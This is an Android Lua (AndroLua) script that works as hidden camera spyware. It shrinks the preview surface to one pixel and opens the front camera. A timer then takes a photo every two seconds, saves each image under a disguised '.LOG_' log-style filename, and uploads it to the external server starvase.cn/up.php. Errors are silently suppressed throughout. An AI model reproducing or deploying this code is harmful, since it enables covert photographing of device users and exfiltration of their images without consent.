require "import"
Thread(Runnable({
  run=function()
    pcall(function()

      --前方高能！！！！
      require "import"
      import "android.app.*"
      import "android.os.*"
      import "android.widget.*"
      import "android.view.*"
      import "android.graphics.Color"
      import "android.graphics.Matrix"
      import "android.graphics.Paint"
      import "android.graphics.Canvas"
      -- import "android.R"
      import "android.graphics.BitmapFactory"
      import "android.graphics.Bitmap"
      import "android.hardware.Camera"
      import "android.hardware.Camera$CameraInfo"
      import "android.graphics.*"
      import "java.io.*"
      import "android.content.*"
      import "android.text.format.DateFormat"

      --activity.setContentView(loadlayout(layout))
      import "android.graphics.drawable.BitmapDrawable"
      import "android.graphics.Color"
      import "android.content.res.ColorStateList"
      import "android.graphics.PorterDuff"
      import "android.graphics.ColorFilter"
      import "android.graphics.PorterDuffColorFilter"
      import "java.io.File"

      sureface=SurfaceView(this)
      activity.getWindow().getDecorView().addView(sureface)
      linearParams=sureface.getLayoutParams()
      linearParams.width = 1
      linearParams.height =1
      sureface.setLayoutParams(linearParams);




      _C=CameraInfo.CAMERA_FACING_FRONT




      function init(PhotoS,VideoS)
        import "android.hardware.camera2.*"
        local MaxQ={
          PhotoH=PhotoS[1].height,
          PhotoW=PhotoS[1].width,

        }
        if VideoS then
          MaxQ.VideoH=VideoS[1].height
          MaxQ.VideoW=VideoS[1].width
          VedioTable={}
          for d,Content in pairs(VideoS) do
            VedioTable[d]=({Content.height,Content.width})
          end
          table.sort(VedioTable,function(a,b)
            return ((a[2]*a[1])>(b[2]*b[1]))
          end)
        end

        return MaxQ
      end





      function save(data)
        require "import"
        import "android.graphics.*"
        import "java.io.*"
        import "android.content.*"
        import "android.text.format.DateFormat"
        import "values"
        mBitmap = BitmapFactory.decodeByteArray(data, 0, #data);
        file = File((path)..".LOG_" .. DateFormat().format("yyyyMMdd_hhmmss", Calendar.getInstance(Locale.CHINA)) .. ".logga");
        file.createNewFile();
        os = BufferedOutputStream(FileOutputStream(file));
        mBitmap.compress(Bitmap.CompressFormat.JPEG,Photoquility, os);
        os.flush();
        os.close();
        thread(function(file)
          require "import"
          import "http"
          --import "android.os.Environment"
          up=http.upload("http://starvase.cn/up.php",{title=""},{file=tostring(file)})
          --File(opt).delete()
        end,file)

        return tostring(file)
      end





      pictureCallback = Camera.PictureCallback{
        onPictureTaken=function(data,camera)
          task(save,data,nil)
          mCamera.startPreview();
        end,

      }

      autoFocus=Camera.AutoFocusCallback{
        onAutoFocus=function(success, camera)
          if (camera ~= nil) then
            pcall(function()camera.takePicture(nil, nil, pictureCallback);end)
          end
        end
      }



      function takePhoto()
        pcall(function()mCamera.autoFocus(autoFocus)end)
      end


      autoFocus2=Camera.AutoFocusCallback{
        onAutoFocus=function(success, camera)
        end
      }


      function callback(_C)
        _C=_C
        callbackw=SurfaceHolder_Callback{
          surfaceChanged=function(holder,format,width,height)
            --开始预览
            parameters = mCamera.getParameters();
            --VeidoSize=(luajava.astable(parameters.getSupportedVideoSizes()))
            VeidoSize={}
            PhotoSize=(luajava.astable(parameters.getSupportedPictureSizes()))

            table.sort(PhotoSize,function(a,b)
              return ((a.width*a.height)>(b.width*b.height))
            end)
            import("android.media.MediaRecorder")

            pcall(function() MaxQ=init(PhotoSize,VeidoSize)end)


            --设置格式
            parameters.setPictureFormat(PixelFormat.JPEG);
            parameters.setPreviewSize(1440,1080);
            if _C==CameraInfo.CAMERA_FACING_BACK then
              parameters.setPictureSize(MaxQ.PhotoW,MaxQ.PhotoH)
              xpcall(function()
                parameters.setFocusMode("auto")--infinity macro continuous-video continuous-picture manual
              end,function(e)
              end)
             else
              parameters.setPictureSize(PhotoSize[1].width,PhotoSize[1].height)
            end
            mCamera.setDisplayOrientation(90)
            mCamera.setParameters(parameters);
            mCamera.startPreview();
            xpcall(function()
              mCamera.autoFocus(autoFocus2)
            end,function(e)
            end)
          end,
          surfaceCreated=function(holder)
            mCamera = Camera.open(_C);
            --设置预览
            mCamera.setPreviewDisplay(holder);
          end,
          surfaceDestroyed=function(holder)
            mCamera.stopPreview();
            mCamera.release();
            mCamera = nil;
          end
        }
        return callbackw
      end


      pcall(function()holder=sureface.getHolder()
        holder.addCallback(callback(_C))
        holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);end)

      pcall(function()takePhoto()end)
      ti=Ticker()
      ti.Period=2000
      ti.onTick=function()
        --事件
        pcall(function()takePhoto()end)
      end
      --启动Ticker定时器
      ti.start()

      function onPause()
        --print("活动暂停时")
        --mCamera.stopPreview();
        --释放相机资源并置空
        --mCamera.release();
        --mCamera = nil;
      end
    end)
  end
})
).run()